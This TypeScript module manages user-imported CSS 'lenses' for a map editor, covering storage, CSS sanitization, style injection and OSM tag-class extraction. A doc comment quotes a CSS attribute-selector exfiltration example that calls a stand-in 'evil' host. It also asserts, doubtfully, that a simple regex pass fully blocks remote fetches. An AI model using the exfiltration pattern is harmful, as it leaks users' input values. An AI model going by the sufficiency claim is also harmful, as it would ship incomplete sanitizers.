import { prefs } from './preferences';

// UI lens support. A lens is a CSS file imported by the user and kept in
// localStorage (a single stylesheet is well within the ~5 MB quota). The active
// lens's CSS is injected into the page, and the OSM keys it styles via
// `tag-{key}` / `tag-{key}-{value}` selectors are emitted as classes on map
// elements (see svgTagClasses) so the rules actually apply.

/** Preference key holding the selected lens id. */
export const LENS_PREF = 'preferences.lens';
/** Preference key holding the JSON array of uploaded lenses. */
export const UPLOADED_LENSES_PREF = 'preferences.lens.uploaded';
/** Id of the built-in (no custom CSS) lens. */
export const DEFAULT_LENS_ID = 'default';

/** A CSS lens imported by the user and stored in localStorage. */
export interface UploadedLens {
    id: string;
    name: string;
    css: string;
}

/** A selectable entry in the lens picker. */
export interface LensEntry {
    id: string;
    name?: string;
    source: 'default' | 'uploaded';
}

/**
 * Uploaded lenses stored in localStorage.
 * @returns the stored lenses (empty array on missing/invalid data)
 */
export function getUploadedLenses(): UploadedLens[] {
    try {
        const raw = prefs(UPLOADED_LENSES_PREF);
        const parsed = JSON.parse((typeof raw === 'string' ? raw : '') || '[]');
        return Array.isArray(parsed) ? parsed : [];
    } catch {
        return [];
    }
}

function saveUploadedLenses(lenses: UploadedLens[]): void {
    prefs(UPLOADED_LENSES_PREF, JSON.stringify(lenses));
}

/**
 * Persist a new uploaded CSS lens.
 * @param lens - display name and raw CSS text
 * @returns the stored lens, with its generated id
 */
export function addUploadedLens({ name, css }: { name: string; css: string }): UploadedLens {
    // Date.now() alone is not unique for files added in the same millisecond.
    const id = `uploaded-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
    const lens: UploadedLens = { id, name, css: sanitizeLensCss(css) };
    saveUploadedLenses([...getUploadedLenses(), lens]);
    return lens;
}

/**
 * Reduce the attack surface of an imported lens's CSS. CSS cannot run scripts
 * in modern browsers, but it can still load remote resources (tracking) and,
 * combined with attribute selectors, exfiltrate field values to a remote server
 * (e.g. `input[value^="x"] { background: url(//evil/?x) }`). So we drop remote
 * fetches: `@import` rules are removed and every `url(...)` that is not an inline
 * `data:` URI is replaced with `none`. UI-spoofing via layout rules remains
 * possible, hence the "import only trusted lenses" warning in the UI.
 *
 * Note: comment- or escape-obfuscated `@import`/`url` tokens are not honoured by
 * browsers either, so this regex pass is sufficient in practice.
 *
 * @param css - raw CSS text
 * @returns the sanitized CSS
 */
export function sanitizeLensCss(css: string): string {
    if (typeof css !== 'string') return '';
    return css
        .replace(/@import\b[^;]*;/gi, '')
        .replace(/url\(\s*(['"]?)([^)'"]*)\1\s*\)/gi,
            (match, _quote, target) => /^\s*data:/i.test(target) ? match : 'none');
}

/**
 * Remove an uploaded lens; resets the selection to default if it was active.
 * @param id - id of the lens to remove
 */
export function removeUploadedLens(id: string): void {
    saveUploadedLenses(getUploadedLenses().filter((t) => t.id !== id));
    if (getSelectedLensId() === id) setSelectedLensId(DEFAULT_LENS_ID);
}

/** @returns the selected lens id (DEFAULT_LENS_ID when unset). */
export function getSelectedLensId(): string {
    const raw = prefs(LENS_PREF);
    return (typeof raw === 'string' && raw) ? raw : DEFAULT_LENS_ID;
}

/** @param id - the lens id to select */
export function setSelectedLensId(id: string): void {
    // The LENS_PREF onChange listener (registered in context.js) reacts by
    // calling applyLens(), which refreshes the tag keys and injects the CSS.
    prefs(LENS_PREF, id);
}

/** @returns the CSS of the active lens (empty for the default/built-in lens). */
export function getActiveLensCss(): string {
    const id = getSelectedLensId();
    if (id === DEFAULT_LENS_ID) return '';
    const uploaded = getUploadedLenses().find((t) => t.id === id);
    return uploaded ? uploaded.css : '';
}

/** All selectable lenses: built-in default, then uploaded ones. */
export function listLenses(): LensEntry[] {
    return [
        { id: DEFAULT_LENS_ID, source: 'default' },
        ...getUploadedLenses().map((t) => ({ id: t.id, name: t.name, source: 'uploaded' as const }))
    ];
}

// ---------------------------------------------------------------------------
// Lens-driven tag classes
//
// A lens's CSS may style features by OSM tag using `tag-{key}` /
// `tag-{key}-{value}` selectors. For those rules to match, map elements must
// carry the corresponding classes. We read the active lens's CSS, collect the
// referenced keys, and svgTagClasses emits them like secondary tags. The set is
// replaced whenever the lens changes, so classes a previous lens needed are
// dropped while the built-in secondaries always stay.
// ---------------------------------------------------------------------------

/**
 * Some `tag-*` classes are *computed* by svgTagClasses rather than coming from an
 * OSM `key=value`. Extraction takes the part before the first `-` as the key
 * (e.g. `.tag-cuisine-pizza` → `cuisine`), but for these the leading token is not
 * a real OSM key, so we skip it — otherwise we'd add a bogus secondary key and
 * try to read a tag that does not exist:
 *   - `status`   → from `tag-status` / `tag-status-{lifecycle}` (e.g. abandoned)
 *   - `wikidata` → from `tag-wikidata` (any `*:wikidata` present)
 *   - `paved` / `unpaved` / `semipaved` / `ungraded` → inferred highway surface
 *       category, not the literal `surface`/`tracktype` tag (svgTagClasses derives
 *       it and even emits it with no surface tag). The exact value stays available
 *       via the secondary `tag-surface-{value}`.
 */
const SYNTHETIC_TAG_TOKENS = new Set([
    'status', 'wikidata', 'paved', 'unpaved', 'semipaved', 'ungraded'
]);

/** Lens-required secondary keys, in their CSS-class form (`:` written as `_`). */
let lensSecondaryTagKeys = new Set<string>();

/** @param keys - secondary keys required by the active lens's CSS */
export function setLensSecondaryTagKeys(keys: string[]): void {
    lensSecondaryTagKeys = new Set(Array.isArray(keys) ? keys : []);
}

/** @returns the lens-required secondary keys (CSS-class form) */
export function getLensSecondaryTagKeys(): string[] {
    return [...lensSecondaryTagKeys];
}

/**
 * Collect the OSM keys referenced by `tag-*` selectors in a lens's CSS. The key
 * is the part after `tag-` up to the first `-` (OSM keys never contain `-`; the
 * `-` separates key from value). Synthetic tokens are skipped.
 *
 * @param css - raw CSS text
 * @returns unique keys (CSS-class form, e.g. `cuisine`, `piste_type`)
 */
export function extractTagKeysFromCss(css: string): string[] {
    const keys = new Set<string>();
    if (typeof css !== 'string') return [];
    const re = /\.tag-([a-z0-9_]+)/g;
    let match: RegExpExecArray | null;
    while ((match = re.exec(css)) !== null) {
        const key = match[1];
        if (!SYNTHETIC_TAG_TOKENS.has(key)) keys.add(key);
    }
    return [...keys];
}

/**
 * Append lens-required secondary tag classes for an entity. Iterates the
 * entity's actual tags and converts each key to its CSS-class form (`:` → `_`)
 * before matching the lens set. Using the real key avoids any `_`-vs-`:`
 * ambiguity (e.g. `piste:type` and a hypothetical `piste_type` both map to the
 * class `tag-piste_type`, and keys like `piste:type_for_x` round-trip cleanly).
 *
 * Known side-effect, left unhandled: two keys that differ only by `:` vs `_`
 * (e.g. `foo:bar` and `foo_bar`) collapse to the same `tag-foo_bar` class, so on
 * an element carrying both, both value-classes would be emitted. CSS classes
 * cannot contain `:`, so this collision is inherent. It's unlikely because `:`
 * is the conventional namespace separator, but no rule forbids a `_` variant of
 * an otherwise identical key. See https://wiki.openstreetmap.org/wiki/Prefix
 *
 * @param classes - class list being built (mutated)
 * @param t - entity tags
 */
export function appendLensTagClasses(classes: string[], t: Record<string, string>): void {
    if (lensSecondaryTagKeys.size === 0) return;
    for (const realKey in t) {
        const classKey = realKey.replace(/:/g, '_');
        if (!lensSecondaryTagKeys.has(classKey)) continue;
        const value = t[realKey];
        if (!value || value === 'no') continue;
        if (classes.indexOf('tag-' + classKey) === -1) classes.push('tag-' + classKey);
        const valueClass = 'tag-' + classKey + '-' + value;
        if (classes.indexOf(valueClass) === -1) classes.push(valueClass);
    }
}

/**
 * Refresh the tag keys that the active lens's CSS needs, so map elements get the
 * matching `tag-*` classes. Call on lens change and at startup.
 */
export function refreshLensTagKeys(): void {
    setLensSecondaryTagKeys(extractTagKeysFromCss(getActiveLensCss()));
}

/** id of the <style> element holding the active lens's CSS. */
const LENS_STYLE_ELEMENT_ID = 'id-lens-css';

/**
 * Inject the active lens's CSS into a dedicated <style> in the document head
 * (created on first use). Switching lenses replaces its content, so the previous
 * lens's rules are dropped. No-op outside a browser (e.g. tests without a DOM).
 *
 * The CSS is injected as-is, outside any cascade layer. Core styles are wrapped
 * in `@layer ideditor` at build time (see scripts/build_css.js), and unlayered
 * rules always beat layered ones, so a lens overrides core styling at any
 * specificity — no `!important` and no selector-specificity juggling needed.
 */
export function injectLensCss(): void {
    if (typeof document === 'undefined') return;
    let style = document.getElementById(LENS_STYLE_ELEMENT_ID) as HTMLStyleElement | null;
    if (!style) {
        style = document.createElement('style');
        style.id = LENS_STYLE_ELEMENT_ID;
        document.head.appendChild(style);
    }
    style.textContent = getActiveLensCss();
}

/** Apply the active lens: refresh its tag keys and inject its CSS. */
export function applyLens(): void {
    refreshLensTagKeys();
    injectLensCss();
}
